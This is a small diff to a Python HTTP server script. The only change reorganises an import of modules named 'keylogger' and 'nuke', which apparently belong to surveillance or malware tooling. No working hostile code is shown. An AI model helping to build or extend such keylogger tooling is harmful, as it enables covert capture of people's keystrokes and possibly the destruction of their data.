@@ -1,6 +1,6 @@
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 import time, threading
-import keylogger, globals, nuke
+import client.keylogger as keylogger, globals, nuke
 
 class CustomHTTPReqHandler(SimpleHTTPRequestHandler):
     def end_headers(self):
